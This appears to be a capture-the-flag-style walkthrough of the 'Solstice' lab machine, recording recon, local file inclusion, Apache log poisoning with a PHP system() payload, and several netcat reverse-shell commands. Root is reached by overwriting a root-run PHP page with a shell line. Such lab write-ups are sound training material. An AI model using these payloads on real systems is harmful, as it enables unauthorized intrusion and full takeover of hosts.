Target: 192.168.235.72
# Recon

## Nmap

 kali  🏡  OSCP  Solstice                                                                                                                                

 →  nmap -p- -sV -sC --open -T4 192.168.235.72 -oN solstice_nmap.txt                                                                                11:02:25

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 11:02 GMT

Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan

Ping Scan Timing: About 100.00% done; ETC: 11:02 (0:00:00 remaining)

Nmap scan report for 192.168.235.72

Host is up (0.051s latency).

Not shown: 63727 closed tcp ports (conn-refused), 1799 filtered tcp ports (no-response)

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit

PORT      STATE SERVICE    VERSION

21/tcp    open  ftp        pyftpdlib 1.5.6

| ftp-syst: 

|   STAT: 

| FTP server status:

|  Connected to: 192.168.235.72:21

|  Waiting for username.

|  TYPE: ASCII; STRUcture: File; MODE: Stream

|  Data connection closed.

|_End of status.

22/tcp    open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

| ssh-hostkey: 

|   2048 5ba737fd556cf8ea03f510bc94320718 (RSA)

|   256 abda6a6f973fb2703e6c2b4b0cb7f64c (ECDSA)

|_  256 ae29d4e346a1b15227838f8fb0c436d1 (ED25519)

25/tcp    open  smtp       Exim smtpd

| smtp-commands: solstice Hello nmap.scanme.org [192.168.45.231], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP

|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP

80/tcp    open  http       Apache httpd 2.4.38 ((Debian))

|_http-server-header: Apache/2.4.38 (Debian)

|_http-title: Site doesn't have a title (text/html).

2121/tcp  open  ftp        pyftpdlib 1.5.6

| ftp-anon: Anonymous FTP login allowed (FTP code 230)

|_drws------   2 www-data www-data     4096 Jun 18  2020 pub

| ftp-syst: 

|   STAT: 

| FTP server status:

|  Connected to: 192.168.235.72:2121

|  Waiting for username.

|  TYPE: ASCII; STRUcture: File; MODE: Stream

|  Data connection closed.

|_End of status.

3128/tcp  open  http-proxy Squid http proxy 4.6

|_http-server-header: squid/4.6

|_http-title: ERROR: The requested URL could not be retrieved

8593/tcp  open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)

| http-cookie-flags: 

|   /: 

|     PHPSESSID: 

|_      httponly flag not set

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

54787/tcp open  http       PHP cli server 5.5 or later (PHP 7.3.14-1)

|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

62524/tcp open  tcpwrapped

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 76.04 seconds

Handfull of services up.

  

## FTP (Alternative)

 →  ftp 192.168.235.72 2121                                                                                                                         13:10:09

Connected to 192.168.235.72.

220 pyftpdlib 1.5.6 ready.

Name (192.168.235.72:kali): anonymous

331 Username ok, send password.

Password: 

230 Login successful.

Remote system type is UNIX.

Using binary mode to transfer files.

ftp> ls

229 Entering extended passive mode (|||43479|).

125 Data connection already open. Transfer starting.

drws------   2 www-data www-data     4096 Jun 18  2020 pub

226 Transfer complete.

ftp> get pub

local: pub remote: pub

229 Entering extended passive mode (|||56083|).

550 Is a directory.

ftp> cd pub

250 "/pub" is the current directory.

ftp> ls

229 Entering extended passive mode (|||38019|).

125 Data connection already open. Transfer starting.

226 Transfer complete.

  

## Web

  

###manual

On web home page 

Currently configuring the database, try later.

Proudly powered by phpIPAM 1.4

Database not configured. Database port at 8593

[http://192.168.235.72:8593/](http://192.168.235.72:8593/)

<html>

    <head>

<link href="https://fonts.googleapis.com/css?family=Comic+Sans" rel="stylesheet"> 

<link rel="stylesheet" type="text/css" href="style.css">

    </head>

    <body>

<div class="menu">

    <a href="index.php">Main Page</a>

    <a href="index.php?book=list">Book List</a>

</div>

We are still setting up the library! Try later on!<p></p>    </body>

</html>

Because book list has a file reference then I'll try to reference other local files.

[http://192.168.235.72:8593/index.php?book=../../../../../etc/passwd](http://192.168.235.72:8593/index.php?book=../../../../../etc/passwd)

Main Page Book List

We are still setting up the library! Try later on!

  

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:107:118::/var/lib/saned:/usr/sbin/nologin colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false miguel:x:1000:1000:,,,:/home/miguel:/bin/bash uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin

  

###dirbuster

Not much on results

 →  dirbuster                                                                                                                                       13:11:58

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

Starting OWASP DirBuster 1.0-RC1

  

Starting dir/file list based brute forcing

Dir found: / - 200

Dir found: /icons/ - 403

Dir found: /icons/small/ - 403

Dir found: /app/ - 403

Dir found: /javascript/ - 403

Dir found: /backup/ - 403

^C⏎ 

  

#Weaponize

So since I can run commands to check out things then I'll try to chain a command afterwards via a reverse shell

Will send through a URL so it'll need top be URL encoded

[https://www.revshells.com/](https://www.revshells.com/)

  

nc%20-c%20%2Fbin%2Fbash%20192.168.45.231%204444

  

Prep nc listener: nc -nlvp 4444 

Find the local device ip address (of the tunnel subnet)                                                                                    

>ip addr

  

5691: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500                                                                                                                          

    link/none                                                                                                                                                                                                                               

    inet 192.168.45.231/24 scope global tun0                                                                                                                                                                                                

       valid_lft forever preferred_lft forever                                                                                                                                                                                              

    inet6 fe80::92e5:afec:95c8:4d4d/64 scope link stable-privacy                                                                                                                                                                            

       valid_lft forever preferred_lft forever 

Now the rev shell command is prepped I'll log poison to get a rev shell

  

More on log poisoning [https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956](https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956)

[http://192.168.235.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%204444%20-e%20%2Fbin%2Fbash%20](http://192.168.235.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%204444%20-e%20%2Fbin%2Fbash%20)

  

curl -s "[http://192.168.235.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%204444%20-e%20%2Fbin%2Fbash%20](http://192.168.235.72:8593/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%204444%20-e%20%2Fbin%2Fbash%20)"

  

Another one since the above didn't seem to work. 80 since it was already open and I rather tunnel through an existing port than set up a new one

curl -s "[http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)"

  

I like the URL encoded / forward slashes

curl -s "http://[192.168.235.72:8593](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20[192.168.45.231](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)%2080%20-e%20%2Fbin%2Fbash%20"

  

-- Post Reboot --

Same IP: 192.168.235.72

  

curl -s "http://[192.168.235.72:8593](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20[192.168.45.231](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)%2080%20-e%20%2Fbin%2Fbash%20"

  

Missed the php shell set command to recognize "cmd"

  

curl 192.168.235.72 -A "<?php system(\$_GET['cmd'])?>"

  

Now for the rev shell prompt from the log

curl -s "http://[192.168.235.72:8593](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)/index.php?book=../../../../../var/log/apache2/access.log&cmd=nc%20[192.168.45.231](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)%2080%20-e%20%2Fbin%2Fbash%20"

  

#Exploit

Run it and now I need to wait for the dirbuster logs to finish before it finishes the log poison and executes the nc rev shell...

  

Not working so I'll reset the VM to remove the logs and try again.

  

Now in and upgrade shell

nc -nlvp 80  
connected to [192.168.235.72](http://192.168.235.72:8593/index.php?book=../../../../../../../var/log/apache2/access.log&cmd=nc%20192.168.45.231%2080%20-e%20/bin/bash%20&)

python -c 'import pty; pty.spawn("/bin/bash")'

www-data@solstice:/home/miguel$ 

www-data@solstice:~$ ls

ls

html  local.txt

www-data@solstice:~$ cat local.txt

cat local.txt

ffcc21b969ac7bbff1732f6d085c4d14

  

#Privilege Escalation 

- SUID/GUID Checks
    

www-data@solstice:~$ find / -type f -perm /4000 2>/dev/null

find / -type f -perm /4000 2>/dev/null

/var/log/exim4/mainlog.1

/var/log/apache2/error.log.1

/var/log/apache2/access.log.1

/var/log/apache2/other_vhosts_access.log

/usr/bin/newgrp

/usr/bin/fusermount

/usr/bin/gpasswd

/usr/bin/sudo

/usr/bin/mount

/usr/bin/su

/usr/bin/chfn

/usr/bin/chsh

/usr/bin/umount

/usr/bin/passwd

/usr/bin/pkexec

/usr/sbin/exim4

/usr/lib/openssh/ssh-keysign

/usr/lib/policykit-1/polkit-agent-helper-1

/usr/lib/eject/dmcrypt-get-device

/usr/lib/uncompress.so

/usr/lib/dbus-1.0/dbus-daemon-launch-helper

- Writable File Checks
    
- Kernel Checks
    

www-data@solstice:~$ uname -a

uname -a

Linux solstice 4.19.0-8-amd64 #1 SMP Debian 4.19.98-1 (2020-01-26) x86_64 GNU/Linux

  

Kali host

 →  searchsploit 4.19                                                                                      19:49:43

---------------------------------------------------------------------------------- ---------------------------------

 Exploit Title                                                                    |  Path                           

---------------------------------------------------------------------------------- ---------------------------------

Coppermine Photo Gallery 1.4.19 - Remote File Upload                              | php/webapps/7909.txt

H2 Database 1.4.196 - Remote Code Execution                                       | java/webapps/45506.py

H2 Database 1.4.197 - Information Disclosure                                      | linux/webapps/45105.py

H2 Database 1.4.199 - JNI Code Execution                                          | java/local/49384.txt

Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module    | linux/dos/46477.txt

Linux Kernel 2.4.18/2.4.19 - Privileged File Descriptor Resource Exhaustion (Deni | linux/dos/21598.c

Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escala | linux/local/47164.sh

Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escala | linux/local/47165.sh

Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escala | linux/local/47166.sh

Linux Kernel 4.15.x < 4.19.2 - 'map_write() CAP_SYS_ADMIN' Local Privilege Escala | linux/local/47167.sh

Marval MSM v14.19.0.12476 - Cross-Site Request Forgery (CSRF)                     | windows/remote/50957.txt

Marval MSM v14.19.0.12476 - Remote Code Execution (RCE) (Authenticated)           | windows/remote/50956.txt

---------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results                                                                                              

Papers: No Results                                                                                                  

 kali  🏡                                                                                                         

 →  searchsploit 4.19.9                                                                                    19:49:44

Exploits: No Results                                                                                                

Shellcodes: No Results                                                                                              

Papers: No Results 

Nothing for current Kernel

- Open ports check
    
- Check running services (running as root)
    

ps -aux | grep root

root       479  0.0  0.0   2388   752 ?        Ss   15:09   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/

root       483  0.0  0.0   2388   752 ?        Ss   15:09   0:00 /bin/sh -c /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/

root       488  0.0  1.4  24304 15124 ?        S    15:09   0:00 /usr/bin/python -m pyftpdlib -p 21 -u 15090e62f66f41b547b75973f9d516af -P 15090e62f66f41b547b75973f9d516af -d /root/ftp/

root       490  0.0  2.0 196744 20976 ?        S    15:09   0:00 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/

root       530  0.0  0.1   5612  1740 tty1     Ss+  15:09   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux

root       634  0.0  1.0  73924 10880 ?        Ss   15:09   0:00 /usr/sbin/squid -sYC

root       675  0.0  0.6  15852  6720 ?        Ss   15:09   0:00 /usr/sbin/sshd -D

root       710  0.0  2.0 199492 20636 ?        Ss   15:09   0:00 /usr/sbin/apache2 -k start

root      1427  0.0  0.7  29212  8088 ?        Ss   15:12   0:00 /usr/sbin/cupsd -l

root      1428  0.0  1.0 182876 10712 ?        Ssl  15:12   0:00 /usr/sbin/cups-browsed

This is strange. Something is running locally on port 57

www-data@solstice:~/html$ cd /var/tmp/sv

cd /var/tmp/sv

www-data@solstice:/var/tmp/sv$ ls

ls

index.php

www-data@solstice:/var/tmp/sv$ cat index.php

cat index.php

<?php

echo "Under construction";

?>

Seems the php script running is this under construction page running on port 57 with root privileges.

I'll replace the index.php construction site with a reverse shell to kali, listen for it, and then access the website

echo "<?php system('nc 192.168.45.231 21 -e /bin/bash')?>" > index.php

curl 127.0.0.1:57

  

Kali

 →  nc -nlvp 21                                                                                                      20:06:06

listening on [any] 21 ...                                                                                                     

connect to [192.168.45.231] from (UNKNOWN) [192.168.235.72] 57736                                                             

whoami                                                                                                                        

root                                                                                                                          

cd                                                                                                                            

ls                                                                                                                            

ftp                                                                                                                           

proof.txt                                                                                                                     

root.txt                                                                                                                

cat proof.txt                                                                                                           

949eb9943dcce67d197725cd417db738                                                                                      

cat root.txt                                                                                                          

Your flag is in another file...


Boot2Root (In a way that actually makes sense)